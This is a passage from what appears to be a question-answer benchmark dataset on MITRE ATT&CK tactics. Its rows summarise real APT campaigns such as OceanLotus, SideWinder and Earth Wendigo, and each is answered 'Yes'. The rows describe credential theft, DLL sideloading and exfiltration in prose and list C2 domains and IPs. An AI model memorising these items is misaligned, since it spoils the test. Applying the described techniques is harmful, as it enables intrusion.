Execution: During the first phase of Operation Cobalt Kitty, the OceanLotus Group operated a fileless PowerShell-based infrastructure using customized payloads from offensive frameworks like Cobalt Strike, PowerSploit, and Nishang. The attackers executed PowerShell scripts with embedded base64-encoded payloads to load additional scripts or fetch payloads from the command-and-control server.
Persistence: The OceanLotus Group established persistence on the network by using Windows registry, services, and scheduled tasks. They executed loader scripts at startup or at predetermined intervals, ensuring the continuous operation of their fileless in-memory payload delivery infrastructure.
Privilege Escalation: The OceanLotus Group used the Mimikatz credential dumping tool to obtain credentials, including user passwords, NTLM hashes, and Kerberos tickets. They customized and obfuscated over 10 different Mimikatz payloads to evade antivirus detection and used the stolen credentials to perform lateral movement and infect more machines.
Defense Evasion: To maintain stealth and avoid detection, the OceanLotus Group exploited DLL hijacking vulnerabilities in trusted applications, bypassing application whitelisting and security software. They also implemented DNS Tunneling as a command-and-control communication method to overcome network filtering solutions, configuring the backdoor to communicate with Google and OpenDNS servers.
Credential Access: The OceanLotus Group harvested credentials stored on compromised machines using the Mimikatz tool. They customized and obfuscated Mimikatz payloads to evade detection and used the stolen credentials to infect additional machines and leverage Windows built-in tools for lateral movement.
Discovery: The OceanLotus Group performed lateral movement and infected new machines during the third phase of Operation Cobalt Kitty. They harvested credentials from compromised machines to facilitate this process.
Command and Control: The OceanLotus Group used HTTP and DNS Tunneling for command-and-control communication, and a novel backdoor that utilized Microsoft Outlook for command execution and data exfiltration.
Exfiltration: The OceanLotus Group exfiltrated data using a backdoor macro installed in Microsoft Outlook, which enabled them to execute commands, deploy tools, and steal valuable data from compromised machines.
Others: Operation Cobalt Kitty was a major cyber espionage APT carried out by the OceanLotus Group against a global corporation in Asia. The attackers continuously adapted their techniques and upgraded their arsenal to remain undetected. Cybereason was able to monitor and detect the entire attack lifecycle, from infiltration to exfiltration. The attackers' tools were not detected by traditional antivirus software, highlighting the sophistication of their methods and the importance of understanding behavioral patterns to combat APTs.",Yes,operation-cobalt-kitty
1794,322,322-Resource Development-T1587-Develop Capabilities,"After using spear-phishing emails with malicious sites or weaponized Word documents to gain initial access and create persistence with scheduled tasks on compromised machines, is it likely that the OceanLotus Group developed a sophisticated arsenal including modified publicly available tools and custom-built tools to evade security products before executing fileless PowerShell-based payloads for further attacks?","Resource Development: The OceanLotus Group developed a sophisticated arsenal for Operation Cobalt Kitty, which included modified publicly-available tools and six undocumented custom-built tools. These tools were designed to evade traditional security products and included two backdoors exploiting DLL sideloading in applications from Microsoft, Google, and Kaspersky, as well as a novel backdoor targeting Microsoft Outlook for command-and-control and data exfiltration.","Reconnaissance: The OceanLotus Group, also known as APT-C-00, SeaLotus, and APT32, initiated Operation Cobalt Kitty by targeting a global corporation based in Asia. They focused on the company's top-level management, including vice presidents, senior directors, and key personnel in operational departments. The attackers used spear-phishing attacks to gather information and compromise over 40 PCs and servers, including critical infrastructure such as the domain controller, file servers, web application server, and database server.
Initial Access: The initial penetration vector for Operation Cobalt Kitty was social engineering through spear-phishing emails containing links to malicious sites or weaponized Word documents with malicious macros. These macros created persistence on the compromised machines using two scheduled tasks designed to download secondary payloads, mainly Cobalt Strike Beacon.
Execution: During the first phase of Operation Cobalt Kitty, the OceanLotus Group operated a fileless PowerShell-based infrastructure using customized payloads from offensive frameworks like Cobalt Strike, PowerSploit, and Nishang. The attackers executed PowerShell scripts with embedded base64-encoded payloads to load additional scripts or fetch payloads from the command-and-control server.
Persistence: The OceanLotus Group established persistence on the network by using Windows registry, services, and scheduled tasks. They executed loader scripts at startup or at predetermined intervals, ensuring the continuous operation of their fileless in-memory payload delivery infrastructure.
Privilege Escalation: The OceanLotus Group used the Mimikatz credential dumping tool to obtain credentials, including user passwords, NTLM hashes, and Kerberos tickets. They customized and obfuscated over 10 different Mimikatz payloads to evade antivirus detection and used the stolen credentials to perform lateral movement and infect more machines.
Defense Evasion: To maintain stealth and avoid detection, the OceanLotus Group exploited DLL hijacking vulnerabilities in trusted applications, bypassing application whitelisting and security software. They also implemented DNS Tunneling as a command-and-control communication method to overcome network filtering solutions, configuring the backdoor to communicate with Google and OpenDNS servers.
Credential Access: The OceanLotus Group harvested credentials stored on compromised machines using the Mimikatz tool. They customized and obfuscated Mimikatz payloads to evade detection and used the stolen credentials to infect additional machines and leverage Windows built-in tools for lateral movement.
Discovery: The OceanLotus Group performed lateral movement and infected new machines during the third phase of Operation Cobalt Kitty. They harvested credentials from compromised machines to facilitate this process.
Lateral Movement: Using stolen credentials, the OceanLotus Group expanded their control within the network by infecting new machines and leveraging Windows built-in tools, pass-the-ticket, and pass-the-hash attacks.
Command and Control: The OceanLotus Group used HTTP and DNS Tunneling for command-and-control communication, and a novel backdoor that utilized Microsoft Outlook for command execution and data exfiltration.
Exfiltration: The OceanLotus Group exfiltrated data using a backdoor macro installed in Microsoft Outlook, which enabled them to execute commands, deploy tools, and steal valuable data from compromised machines.
Others: Operation Cobalt Kitty was a major cyber espionage APT carried out by the OceanLotus Group against a global corporation in Asia. The attackers continuously adapted their techniques and upgraded their arsenal to remain undetected. Cybereason was able to monitor and detect the entire attack lifecycle, from infiltration to exfiltration. The attackers' tools were not detected by traditional antivirus software, highlighting the sophistication of their methods and the importance of understanding behavioral patterns to combat APTs.",Yes,operation-cobalt-kitty
1797,323,323-Execution-T1129-Shared Modules,"After exploiting the Adobe Flash Player vulnerability (CVE-2015-5119) for initial access on the PCA website, is it likely that the attackers used the dropper executable Rdws.exe for DLL sideloading before evading defenses by deploying a malicious DLL alongside a legitimate program executable?","Execution: The malware payload identified as Rdws.exe, a dropper executable, deployed its main component via a DLL sideloading technique. It used the legitimate Google Chrome Frame Helper executable (LMS.exe) to load a malicious DLL (dbghelp.dll), which then loaded a backdoor binary blob (ticrf.rat).","Initial Access: In early July 2015, Chinese APT actors exploited a vulnerability in Adobe Flash Player (CVE-2015-5119) by embedding it within a webpage of the Permanent Court of Arbitration (PCA) that detailed a legal case between the Philippines and China. The exploit was strategically placed on the PCA website during the tribunal, targeting visitors interested in the case.
Defense Evasion: The attackers used a sideloading technique to evade defenses, deploying a malicious DLL alongside a legitimate program executable. The malware connected back to the exploit domain and a subdomain, both part of the attackers' infrastructure.
Command and Control: The malware connected back to the exploit domain pic.nicklockluckydog[.]org and the subdomain ssl.nicklockluckydog[.]org for command and control. The domain ssl.nicklockluckydog[.]org resolved to an IP address in Seoul, South Korea, at the time of analysis.
Others: The attackers compromised the PCA webpages and altered them to load the malicious URL containing the Flash exploit. The domain used for the exploit was registered using falsified information. ThreatConnect shared details of the incident within Incident 20150710D: Permanent Court of Arbitration Flash Exploit.",Yes,China_Peace_Palace
1798,323,323-Command and Control-T1071-Application Layer Protocol,"After using sideloading techniques to deploy a malicious DLL and establish evasion, is it likely that the malware will connect back to the exploit domain pic.nicklockluckydog[.]org during command and control communication?","Command and Control: The malware connected back to the exploit domain pic.nicklockluckydog[.]org and the subdomain ssl.nicklockluckydog[.]org for command and control. The domain ssl.nicklockluckydog[.]org resolved to an IP address in Seoul, South Korea, at the time of analysis.","Initial Access: In early July 2015, Chinese APT actors exploited a vulnerability in Adobe Flash Player (CVE-2015-5119) by embedding it within a webpage of the Permanent Court of Arbitration (PCA) that detailed a legal case between the Philippines and China. The exploit was strategically placed on the PCA website during the tribunal, targeting visitors interested in the case.
Execution: The malware payload identified as Rdws.exe, a dropper executable, deployed its main component via a DLL sideloading technique. It used the legitimate Google Chrome Frame Helper executable (LMS.exe) to load a malicious DLL (dbghelp.dll), which then loaded a backdoor binary blob (ticrf.rat).
Defense Evasion: The attackers used a sideloading technique to evade defenses, deploying a malicious DLL alongside a legitimate program executable. The malware connected back to the exploit domain and a subdomain, both part of the attackers' infrastructure.
Others: The attackers compromised the PCA webpages and altered them to load the malicious URL containing the Flash exploit. The domain used for the exploit was registered using falsified information. ThreatConnect shared details of the incident within Incident 20150710D: Permanent Court of Arbitration Flash Exploit.",Yes,China_Peace_Palace
1800,324,324-Impact-T1498-Network Denial of Service,"After FireEye observed two different single-byte XOR keys used to encode configuration files issued by the DDOS C2 servers in this campaign, is it likely that attackers launched Distributed Denial of Service attacks against websites promoting democracy in Hong Kong and caused Next Media's network to suffer a 'total failure'?","Impact: Attackers have launched a series of Distributed Denial of Service attacks (DDoS) against websites promoting democracy in Hong Kong. Websites belonging to Next Media's Apple Daily publication have suffered from an ongoing DDoS attack that brought down its email system for hours. Next Media's network has suffered a 'total failure' as a result of these attacks. Additionally, at least one member of the popular online forum HKGolden was arrested for posting messages encouraging support for the OccupyCentral Pro Democracy movement.","Command and Control: FireEye has identified binaries coded to receive instructions from a set of command and control (C2) servers instructing participating bots to attack Next Media-owned websites and the HKGolden forum. These binaries are W32 Cabinet self-extracting files that drop a variant of an older DDoS tool known as KernelBot. The KernelBot implants receive targeting instructions from C2 servers hard-coded directly into the sample. FireEye observed two different single-byte XOR keys used to encode configuration files issued by the DDOS C2 servers in this campaign. The encoded configuration file decodes to a set of instructions for the KernelBot network to attack various domains and IPs, primarily associated with Next Media or Apple daily websites, with the exception of a few IPs hosting the HKGolden forum.
Others: The DDoS attacks are linked to previously observed APT activity, including Operation Poisoned Hurricane. The overlap in the tools and infrastructure used by China-based advanced persistent threat (APT) actors and the DDoS attack activity suggests potential relationships, symbiosis, and tool sharing between patriotic hacker activities designed to disrupt anti-government activists in China, and the APT activity focused on IP theft and espionage. The use of digital certificates previously used by APT actors to sign binaries in previous intrusion operations, such as the QTI International and CallTogether code signing certificates, further links these DDoS attacks to previous APT activity. The evidence may indicate that a common quartermaster supports both the DDoS attacks and ongoing intrusion activity. The Chinese government is the entity most likely to be interested in achieving both of these objectives.",Yes,Operation_Poisoned_Handover
1807,325,325-Collection-T1113-Screen Capture,"After establishing persistence by dropping 'intel.wll' into the Word startup folder and requiring a relaunch of Microsoft Word for execution, is it likely that the RAT module downloaded during the final stage of the infection chain will have capabilities to take screenshots, list files and directories, and execute new processes as part of its functionality?","Collection: The RAT module downloaded during the final stage of the infection chain has capabilities to take screenshots, list files and directories, create and delete directories, move and delete files, download files, and execute new processes.","Initial Access: Check Point Research identified a campaign targeting the Mongolian public sector using two RTF documents exploiting Microsoft Word vulnerabilities to deliver a new malware implant. The documents, weaponized with RoyalRoad tool version 7.x, were sent under the guise of information related to COVID-19, originating from the Mongolian Ministry of Foreign Affairs. Upon opening, the RTF files exploit the Equation Editor vulnerabilities, leading to the dropping of 'intel.wll' into the Word startup folder, establishing persistence and requiring a relaunch of Word for full execution.
Execution: The 'intel.wll' file, once executed, downloads and decrypts the next stage of the infection chain from the server at 95.179.242[.]6. This stage is a DLL file acting as the main loader for the malware framework, which communicates with another C&C server at 95.179.242[.]27 to receive additional functionality. The threat actor's C&C server operates within a limited daily window, complicating the analysis of the advanced parts of the infection chain. The final stage involves downloading and decrypting a RAT module, also a DLL, which is loaded into memory. This modular architecture suggests the possibility of additional modules beyond the observed payload.
Persistence: The malware uses the Word startup folder to maintain persistence by dropping the 'intel.wll' file, which is executed every time Microsoft Word is launched.
Defense Evasion: The attackers' C&C server at 95.179.242[.]6 was found to have directory listing enabled for a limited time, revealing the operation timeline and working hours of the attackers. All files on the server were encrypted, but decryption was possible using the same scheme observed in the infection chain. The attackers seem to enable directory listing when actively using a payload delivery server.
Command and Control: The main loader of the malware communicates with a C&C server at 95.179.242[.]27 to receive additional functionality. The RAT module communicates with the C&C server to receive commands and send collected data.
Others: The campaign, attributed to a Chinese-based threat actor, has been active since at least 2016, targeting various sectors in countries like Ukraine, Russia, and Belarus. The infrastructure used includes Vultr servers and GoDaddy-registered domains. The malware's full intention remains unclear, but it is part of a long-running operation leveraging the COVID-19 pandemic to lure victims. Check Point SandBlast Agent can protect against this APT attack.",Yes,Vicious Panda_ The COVID Campaign - Check Point Research
1812,327,327-Initial Access-T1566-Phishing,"After executing malicious scripts to manipulate webmail session keys and performing exploitation of a webmail system's XSS vulnerability to inject JavaScript permanently, is it likely that Earth Wendigo will maintain their foothold by exploiting XSS vulnerabilities in the shortcut feature to inject malicious code and registering malicious JavaScript as a Service Worker script in the browser?","Initial Access: The Earth Wendigo campaign initiated their attack with spear-phishing emails containing obfuscated JavaScript. When victims opened the email on their webmail page, the JavaScript would load malicious scripts from a remote server to steal browser cookies and webmail session keys, append malicious scripts to email signatures for propagation, and exploit XSS vulnerabilities in the webmail system.","Execution: The malicious scripts executed by Earth Wendigo included cookie stealers and scripts that manipulated webmail session keys and browser cookies. Additionally, they exploited a webmail system's XSS vulnerability to inject malicious JavaScript permanently and registered a malicious JavaScript code to the Service Worker feature in web browsers.
Persistence: To maintain their foothold, Earth Wendigo used two methods: exploiting an XSS vulnerability in the webmail system's shortcut feature to inject malicious code, and registering a malicious JavaScript to the Service Worker script in the browser.
Defense Evasion: Earth Wendigo evaded detection by hiding malicious code inside CSS elements and leveraging the webmail system's search suggestion function to execute their script indirectly. They also manipulated email signatures and used Service Worker scripts to intercept and manipulate HTTPS requests.
Credential Access: The Service Worker script used by Earth Wendigo intercepted HTTPS POST requests to the webmail login API to steal username and password pairs, which were then sent to a remote server.
Command and Control: Earth Wendigo established a WebSocket connection between the victims' browsers and their WebSocket server to control the JavaScript backdoor and instruct it to read and exfiltrate emails from the webmail server.
Exfiltration: The JavaScript backdoor created by Earth Wendigo facilitated the exfiltration of mailbox content and attachments via a WebSocket connection to their server. The backdoor executed commands to collect and send email data back to the WebSocket server.
Others: Additional findings include the discovery of multiple malware variants used by Earth Wendigo, written in Python and compiled as Windows executables. These variants communicated with the same malicious domain used in the webmail server attacks and included shellcode loaders and backdoors. However, the specific code delivered by the command and control server could not be verified as the server was down during investigation.",Yes,trendmicro.com-Earth Wendigo Injects JavaScript Backdoor for Mailbox Exfiltration
1818,327,327-Exfiltration-T1048-Exfiltration Over Alternative Protocol,"After Earth Wendigo established a WebSocket connection between the victims' browsers and their WebSocket server for Command and Control, is it likely that the JavaScript backdoor facilitated the exfiltration of mailbox content and attachments by executing commands to collect email data and send it back to the WebSocket server?",Exfiltration: The JavaScript backdoor created by Earth Wendigo facilitated the exfiltration of mailbox content and attachments via a WebSocket connection to their server. The backdoor executed commands to collect and send email data back to the WebSocket server.,"Initial Access: The Earth Wendigo campaign initiated their attack with spear-phishing emails containing obfuscated JavaScript. When victims opened the email on their webmail page, the JavaScript would load malicious scripts from a remote server to steal browser cookies and webmail session keys, append malicious scripts to email signatures for propagation, and exploit XSS vulnerabilities in the webmail system.
Execution: The malicious scripts executed by Earth Wendigo included cookie stealers and scripts that manipulated webmail session keys and browser cookies. Additionally, they exploited a webmail system's XSS vulnerability to inject malicious JavaScript permanently and registered a malicious JavaScript code to the Service Worker feature in web browsers.
Persistence: To maintain their foothold, Earth Wendigo used two methods: exploiting an XSS vulnerability in the webmail system's shortcut feature to inject malicious code, and registering a malicious JavaScript to the Service Worker script in the browser.
Defense Evasion: Earth Wendigo evaded detection by hiding malicious code inside CSS elements and leveraging the webmail system's search suggestion function to execute their script indirectly. They also manipulated email signatures and used Service Worker scripts to intercept and manipulate HTTPS requests.
Credential Access: The Service Worker script used by Earth Wendigo intercepted HTTPS POST requests to the webmail login API to steal username and password pairs, which were then sent to a remote server.
Command and Control: Earth Wendigo established a WebSocket connection between the victims' browsers and their WebSocket server to control the JavaScript backdoor and instruct it to read and exfiltrate emails from the webmail server.
Others: Additional findings include the discovery of multiple malware variants used by Earth Wendigo, written in Python and compiled as Windows executables. These variants communicated with the same malicious domain used in the webmail server attacks and included shellcode loaders and backdoors. However, the specific code delivered by the command and control server could not be verified as the server was down during investigation.",Yes,trendmicro.com-Earth Wendigo Injects JavaScript Backdoor for Mailbox Exfiltration
1826,329,329-Command and Control-T1132-Data Encoding,"After the callCam app collects extensive information from compromised devices, including device and application data, is it likely that the SideWinder APT group will encode C&C server addresses in Base64 and use the server to download exploits and additional payloads?",Command and Control: The SideWinder group used a C&C server to communicate with the compromised devices and to download exploits and additional payload. The C&C server addresses were encoded in Base64 and configured using Apps Conversion Tracking.,"Initial Access: The SideWinder APT group exploited CVE-2019-2215, a use-after-free vulnerability in Android's Binder IPC system, to compromise devices via malicious apps on Google Play. These apps, disguised as photography and file manager tools, have been active since March 2019. The apps Camero and FileCrypt Manager acted as droppers, downloading additional DEX files from a C&C server to install the callCam app without user awareness.
Execution: The SideWinder APT group's callCam app, once installed, hides its icon and executes in the background to collect sensitive information from the device.
Privilege Escalation: SideWinder used two methods for privilege escalation: 1) Device rooting for specific devices using exploits from the C&C server, including CVE-2019-2215 and MediaTek-SU. 2) Using accessibility permissions on typical Android phones to install the payload app callCam.
Defense Evasion: To evade detection, SideWinder employed obfuscation, data encryption, and dynamic code invocation. The dropper apps used an overlay screen to hide the installation and launch of the payload app from the user.
Discovery: The callCam app collected extensive information from compromised devices, including location, battery status, files, installed apps, device information, sensor data, camera information, screenshots, account details, Wi-Fi information, and data from various applications such as WeChat, Outlook, Twitter, Yahoo Mail, Facebook, Gmail, and Chrome.
Collection: The callCam app collected various types of data from the compromised devices, which was then encrypted using RSA and AES encryption algorithms before being sent to the C&C server.
Exfiltration: The callCam app encrypted the collected data using RSA and AES encryption algorithms, verified data integrity with SHA256, and customized the encoding routine before exfiltrating it to the C&C server.
Others: Trend Micro's Mobile Security for Android detects the malicious apps used by SideWinder. The Mobile Security for Enterprise suite provides additional protections. Indicators of Compromise (IoCs) include SHA256 hashes of the malicious apps and C&C server domains such as ms-ethics.net, deb-cn.net, ap1-acl.net, ms-db.net, aws-check.net, and reawk.net.",Yes,"First Active Attack Exploiting CVE-2019-2215 Found on Google Play, Linked to SideWinder APT Group"
1828,329,329-Discovery-T1614-System Location Discovery,"After SideWinder APT group evades detection using obfuscation and data encryption methods, is it likely that the callCam app will collect information about the device's location as part of its discovery operations before encrypting the collected data for exfiltration to the C&C server?","Discovery: The callCam app collected extensive information from compromised devices, including location, battery status, files, installed apps, device information, sensor data, camera information, screenshots, account details, Wi-Fi information, and data from various applications such as WeChat, Outlook, Twitter, Yahoo Mail, Facebook, Gmail, and Chrome.","Initial Access: The SideWinder APT group exploited CVE-2019-2215, a use-after-free vulnerability in Android's Binder IPC system, to compromise devices via malicious apps on Google Play. These apps, disguised as photography and file manager tools, have been active since March 2019. The apps Camero and FileCrypt Manager acted as droppers, downloading additional DEX files from a C&C server to install the callCam app without user awareness.
Execution: The SideWinder APT group's callCam app, once installed, hides its icon and executes in the background to collect sensitive information from the device.
Privilege Escalation: SideWinder used two methods for privilege escalation: 1) Device rooting for specific devices using exploits from the C&C server, including CVE-2019-2215 and MediaTek-SU. 2) Using accessibility permissions on typical Android phones to install the payload app callCam.
Defense Evasion: To evade detection, SideWinder employed obfuscation, data encryption, and dynamic code invocation. The dropper apps used an overlay screen to hide the installation and launch of the payload app from the user.
Collection: The callCam app collected various types of data from the compromised devices, which was then encrypted using RSA and AES encryption algorithms before being sent to the C&C server.
Command and Control: The SideWinder group used a C&C server to communicate with the compromised devices and to download exploits and additional payload. The C&C server addresses were encoded in Base64 and configured using Apps Conversion Tracking.
Exfiltration: The callCam app encrypted the collected data using RSA and AES encryption algorithms, verified data integrity with SHA256, and customized the encoding routine before exfiltrating it to the C&C server.
Others: Trend Micro's Mobile Security for Android detects the malicious apps used by SideWinder. The Mobile Security for Enterprise suite provides additional protections. Indicators of Compromise (IoCs) include SHA256 hashes of the malicious apps and C&C server domains such as ms-ethics.net, deb-cn.net, ap1-acl.net, ms-db.net, aws-check.net, and reawk.net.",Yes,"First Active Attack Exploiting CVE-2019-2215 Found on Google Play, Linked to SideWinder APT Group"
1829,329,329-Discovery-T1083-File and Directory Discovery,"After evading detection through overlay screens during the installation of the payload app, is it likely that the callCam app will collect files and screenshots from compromised devices before encrypting this data using RSA and AES encryption algorithms for exfiltration to the C&C server?","Discovery: The callCam app collected extensive information from compromised devices, including location, battery status, files, installed apps, device information, sensor data, camera information, screenshots, account details, Wi-Fi information, and data from various applications such as WeChat, Outlook, Twitter, Yahoo Mail, Facebook, Gmail, and Chrome.","Initial Access: The SideWinder APT group exploited CVE-2019-2215, a use-after-free vulnerability in Android's Binder IPC system, to compromise devices via malicious apps on Google Play. These apps, disguised as photography and file manager tools, have been active since March 2019. The apps Camero and FileCrypt Manager acted as droppers, downloading additional DEX files from a C&C server to install the callCam app without user awareness.
Execution: The SideWinder APT group's callCam app, once installed, hides its icon and executes in the background to collect sensitive information from the device.
Privilege Escalation: SideWinder used two methods for privilege escalation: 1) Device rooting for specific devices using exploits from the C&C server, including CVE-2019-2215 and MediaTek-SU. 2) Using accessibility permissions on typical Android phones to install the payload app callCam.
Defense Evasion: To evade detection, SideWinder employed obfuscation, data encryption, and dynamic code invocation. The dropper apps used an overlay screen to hide the installation and launch of the payload app from the user.
Collection: The callCam app collected various types of data from the compromised devices, which was then encrypted using RSA and AES encryption algorithms before being sent to the C&C server.
Command and Control: The SideWinder group used a C&C server to communicate with the compromised devices and to download exploits and additional payload. The C&C server addresses were encoded in Base64 and configured using Apps Conversion Tracking.
Exfiltration: The callCam app encrypted the collected data using RSA and AES encryption algorithms, verified data integrity with SHA256, and customized the encoding routine before exfiltrating it to the C&C server.
Others: Trend Micro's Mobile Security for Android detects the malicious apps used by SideWinder. The Mobile Security for Enterprise suite provides additional protections. Indicators of Compromise (IoCs) include SHA256 hashes of the malicious apps and C&C server domains such as ms-ethics.net, deb-cn.net, ap1-acl.net, ms-db.net, aws-check.net, and reawk.net.",Yes,"First Active Attack Exploiting CVE-2019-2215 Found on Google Play, Linked to SideWinder APT Group"
1831,329,329-Discovery-T1082-System Information Discovery,"After SideWinder evades detection by using obfuscation, data encryption, and dynamic code invocation, is the callCam app likely to collect device information by executing in the background before encrypting the data and sending it to the C&C server?","Discovery: The callCam app collected extensive information from compromised devices, including location, battery status, files, installed apps, device information, sensor data, camera information, screenshots, account details, Wi-Fi information, and data from various applications such as WeChat, Outlook, Twitter, Yahoo Mail, Facebook, Gmail, and Chrome.","Initial Access: The SideWinder APT group exploited CVE-2019-2215, a use-after-free vulnerability in Android's Binder IPC system, to compromise devices via malicious apps on Google Play. These apps, disguised as photography and file manager tools, have been active since March 2019. The apps Camero and FileCrypt Manager acted as droppers, downloading additional DEX files from a C&C server to install the callCam app without user awareness.
Execution: The SideWinder APT group's callCam app, once installed, hides its icon and executes in the background to collect sensitive information from the device.
Privilege Escalation: SideWinder used two methods for privilege escalation: 1) Device rooting for specific devices using exploits from the C&C server, including CVE-2019-2215 and MediaTek-SU. 2) Using accessibility permissions on typical Android phones to install the payload app callCam.
Defense Evasion: To evade detection, SideWinder employed obfuscation, data encryption, and dynamic code invocation. The dropper apps used an overlay screen to hide the installation and launch of the payload app from the user.
Collection: The callCam app collected various types of data from the compromised devices, which was then encrypted using RSA and AES encryption algorithms before being sent to the C&C server.
Command and Control: The SideWinder group used a C&C server to communicate with the compromised devices and to download exploits and additional payload. The C&C server addresses were encoded in Base64 and configured using Apps Conversion Tracking.
Exfiltration: The callCam app encrypted the collected data using RSA and AES encryption algorithms, verified data integrity with SHA256, and customized the encoding routine before exfiltrating it to the C&C server.
Others: Trend Micro's Mobile Security for Android detects the malicious apps used by SideWinder. The Mobile Security for Enterprise suite provides additional protections. Indicators of Compromise (IoCs) include SHA256 hashes of the malicious apps and C&C server domains such as ms-ethics.net, deb-cn.net, ap1-acl.net, ms-db.net, aws-check.net, and reawk.net.",Yes,"First Active Attack Exploiting CVE-2019-2215 Found on Google Play, Linked to SideWinder APT Group"
1832,329,329-Discovery-T1120-Peripheral Device Discovery,"After employing defensive evasion techniques such as data encryption and obfuscation to conceal its activities, is SideWinder likely to use the callCam app to collect camera information from compromised devices before encrypting the data with RSA and AES before exfiltration to the C&C server?","Discovery: The callCam app collected extensive information from compromised devices, including location, battery status, files, installed apps, device information, sensor data, camera information, screenshots, account details, Wi-Fi information, and data from various applications such as WeChat, Outlook, Twitter, Yahoo Mail, Facebook, Gmail, and Chrome.","Initial Access: The SideWinder APT group exploited CVE-2019-2215, a use-after-free vulnerability in Android's Binder IPC system, to compromise devices via malicious apps on Google Play. These apps, disguised as photography and file manager tools, have been active since March 2019. The apps Camero and FileCrypt Manager acted as droppers, downloading additional DEX files from a C&C server to install the callCam app without user awareness.
Execution: The SideWinder APT group's callCam app, once installed, hides its icon and executes in the background to collect sensitive information from the device.
Privilege Escalation: SideWinder used two methods for privilege escalation: 1) Device rooting for specific devices using exploits from the C&C server, including CVE-2019-2215 and MediaTek-SU. 2) Using accessibility permissions on typical Android phones to install the payload app callCam.
Defense Evasion: To evade detection, SideWinder employed obfuscation, data encryption, and dynamic code invocation. The dropper apps used an overlay screen to hide the installation and launch of the payload app from the user.
Collection: The callCam app collected various types of data from the compromised devices, which was then encrypted using RSA and AES encryption algorithms before being sent to the C&C server.
Command and Control: The SideWinder group used a C&C server to communicate with the compromised devices and to download exploits and additional payload. The C&C server addresses were encoded in Base64 and configured using Apps Conversion Tracking.
Exfiltration: The callCam app encrypted the collected data using RSA and AES encryption algorithms, verified data integrity with SHA256, and customized the encoding routine before exfiltrating it to the C&C server.
Others: Trend Micro's Mobile Security for Android detects the malicious apps used by SideWinder. The Mobile Security for Enterprise suite provides additional protections. Indicators of Compromise (IoCs) include SHA256 hashes of the malicious apps and C&C server domains such as ms-ethics.net, deb-cn.net, ap1-acl.net, ms-db.net, aws-check.net, and reawk.net.",Yes,"First Active Attack Exploiting CVE-2019-2215 Found on Google Play, Linked to SideWinder APT Group"
1833,329,329-Discovery-T1087-Account Discovery,"After the SideWinder APT group exploited CVE-2019-2215 to gain initial access and disguised malicious apps like Camero and FileCrypt Manager acted as droppers, is it likely that the callCam app will collect account details during the discovery phase before the collected data is encrypted and prepared for exfiltration using RSA and AES encryption algorithms?","Discovery: The callCam app collected extensive information from compromised devices, including location, battery status, files, installed apps, device information, sensor data, camera information, screenshots, account details, Wi-Fi information, and data from various applications such as WeChat, Outlook, Twitter, Yahoo Mail, Facebook, Gmail, and Chrome.","Initial Access: The SideWinder APT group exploited CVE-2019-2215, a use-after-free vulnerability in Android's Binder IPC system, to compromise devices via malicious apps on Google Play. These apps, disguised as photography and file manager tools, have been active since March 2019. The apps Camero and FileCrypt Manager acted as droppers, downloading additional DEX files from a C&C server to install the callCam app without user awareness.
Execution: The SideWinder APT group's callCam app, once installed, hides its icon and executes in the background to collect sensitive information from the device.
Privilege Escalation: SideWinder used two methods for privilege escalation: 1) Device rooting for specific devices using exploits from the C&C server, including CVE-2019-2215 and MediaTek-SU. 2) Using accessibility permissions on typical Android phones to install the payload app callCam.
Defense Evasion: To evade detection, SideWinder employed obfuscation, data encryption, and dynamic code invocation. The dropper apps used an overlay screen to hide the installation and launch of the payload app from the user.
Collection: The callCam app collected various types of data from the compromised devices, which was then encrypted using RSA and AES encryption algorithms before being sent to the C&C server.
Command and Control: The SideWinder group used a C&C server to communicate with the compromised devices and to download exploits and additional payload. The C&C server addresses were encoded in Base64 and configured using Apps Conversion Tracking.
Exfiltration: The callCam app encrypted the collected data using RSA and AES encryption algorithms, verified data integrity with SHA256, and customized the encoding routine before exfiltrating it to the C&C server.
Others: Trend Micro's Mobile Security for Android detects the malicious apps used by SideWinder. The Mobile Security for Enterprise suite provides additional protections. Indicators of Compromise (IoCs) include SHA256 hashes of the malicious apps and C&C server domains such as ms-ethics.net, deb-cn.net, ap1-acl.net, ms-db.net, aws-check.net, and reawk.net.",Yes,"First Active Attack Exploiting CVE-2019-2215 Found on Google Play, Linked to SideWinder APT Group"
1837,329,329-Collection-T1560-Archive Collected Data,"After the callCam app collects extensive information from compromised devices during the Discovery phase, is it likely to encrypt the collected data using RSA and AES encryption algorithms during the Collection phase, before sending it to the C&C server using a customized encoding routine in the Exfiltration phase?","Collection: The callCam app collected various types of data from the compromised devices, which was then encrypted using RSA and AES encryption algorithms before being sent to the C&C server.","Initial Access: The SideWinder APT group exploited CVE-2019-2215, a use-after-free vulnerability in Android's Binder IPC system, to compromise devices via malicious apps on Google Play. These apps, disguised as photography and file manager tools, have been active since March 2019. The apps Camero and FileCrypt Manager acted as droppers, downloading additional DEX files from a C&C server to install the callCam app without user awareness.
Execution: The SideWinder APT group's callCam app, once installed, hides its icon and executes in the background to collect sensitive information from the device.
Privilege Escalation: SideWinder used two methods for privilege escalation: 1) Device rooting for specific devices using exploits from the C&C server, including CVE-2019-2215 and MediaTek-SU. 2) Using accessibility permissions on typical Android phones to install the payload app callCam.
Defense Evasion: To evade detection, SideWinder employed obfuscation, data encryption, and dynamic code invocation. The dropper apps used an overlay screen to hide the installation and launch of the payload app from the user.
Discovery: The callCam app collected extensive information from compromised devices, including location, battery status, files, installed apps, device information, sensor data, camera information, screenshots, account details, Wi-Fi information, and data from various applications such as WeChat, Outlook, Twitter, Yahoo Mail, Facebook, Gmail, and Chrome.
Command and Control: The SideWinder group used a C&C server to communicate with the compromised devices and to download exploits and additional payload. The C&C server addresses were encoded in Base64 and configured using Apps Conversion Tracking.
Exfiltration: The callCam app encrypted the collected data using RSA and AES encryption algorithms, verified data integrity with SHA256, and customized the encoding routine before exfiltrating it to the C&C server.
Others: Trend Micro's Mobile Security for Android detects the malicious apps used by SideWinder. The Mobile Security for Enterprise suite provides additional protections. Indicators of Compromise (IoCs) include SHA256 hashes of the malicious apps and C&C server domains such as ms-ethics.net, deb-cn.net, ap1-acl.net, ms-db.net, aws-check.net, and reawk.net.",Yes,"First Active Attack Exploiting CVE-2019-2215 Found on Google Play, Linked to SideWinder APT Group"
